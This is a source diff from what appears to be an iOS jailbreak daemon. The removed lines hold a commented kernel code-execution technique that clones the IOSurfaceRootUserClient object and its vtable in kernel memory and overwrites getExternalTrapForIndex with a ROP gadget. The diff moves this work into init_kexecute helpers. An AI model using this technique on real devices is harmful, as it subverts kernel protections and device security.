@@ -51,9 +51,6 @@ mach_port_t tfpzero;
 uint64_t kernel_base;
 uint64_t kernel_slide;
 
-mach_port_t user_client;
-uint64_t fake_client;
-
 #define MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT 6
 int memorystatus_control(uint32_t command, int32_t pid, uint32_t flags, void *buffer, size_t buffersize);
 
@@ -82,55 +79,7 @@ int runserver(){
     kernel_slide = kernel_base - 0xFFFFFFF007004000;
     NSLog(@"[jailbreakd] slide: 0x%016llx", kernel_slide);
 
-    user_client = prepare_user_client();
-
-    // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
-    uint64_t IOSurfaceRootUserClient_port = find_port(user_client); // UserClients are just mach_ports, so we find its address
-    NSLog(@"Found port: 0x%llx", IOSurfaceRootUserClient_port);
-
-    uint64_t IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject); // The UserClient itself (the C++ object) is at the kobject field
-    NSLog(@"Found addr: 0x%llx", IOSurfaceRootUserClient_addr);
-
-    uint64_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
-    NSLog(@"Found vtab: 0x%llx", IOSurfaceRootUserClient_vtab);
-
-    // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
-    // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
-
-
-    // Create the vtable in the kernel memory, then copy the existing vtable into there
-    uint64_t fake_vtable = kalloc(0x1000);
-    NSLog(@"Created fake_vtable at %016llx", fake_vtable);
-
-    for (int i = 0; i < 0x200; i++) {
-        wk64(fake_vtable+i*8, rk64(IOSurfaceRootUserClient_vtab+i*8));
-    }
-
-    NSLog(@"Copied some of the vtable over");
-
-
-    // Create the fake user client
-    fake_client = kalloc(0x1000);
-    NSLog(@"Created fake_client at %016llx", fake_client);
-
-    for (int i = 0; i < 0x200; i++) {
-        wk64(fake_client+i*8, rk64(IOSurfaceRootUserClient_addr+i*8));
-    }
-
-    NSLog(@"Copied the user client over");
-
-    // Write our fake vtable into the fake user client
-    wk64(fake_client, fake_vtable);
-
-    // Replace the user client with ours
-    wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, fake_client);
-
-    // Now the userclient port we have will look into our fake user client rather than the old one
-
-    // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
-    wk64(fake_vtable+8*0xB7, find_add_x0_x0_0x40_ret());
-
-    NSLog(@"Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex");
+    init_kexecute();
 
     struct sockaddr_in serveraddr; /* server's addr */
     struct sockaddr_in clientaddr; /* client addr */
@@ -160,7 +109,8 @@ int runserver(){
 
     if (bind(sockfd, (struct sockaddr *)&serveraddr, sizeof(serveraddr)) < 0){
         NSLog(@"[jailbreakd] Error binding...");
-        wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, IOSurfaceRootUserClient_addr);
+        term_kernel();
+        term_kexecute();
         exit(-1);
     }
     NSLog(@"[jailbreakd] Server running!");
@@ -242,7 +192,8 @@ int runserver(){
         }
         if (command == JAILBREAKD_COMMAND_EXIT){
             NSLog(@"Got Exit Command! Goodbye!");
-            wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, IOSurfaceRootUserClient_addr);
+            term_kernel();
+            term_kexecute();
             exit(0);
         }
     }
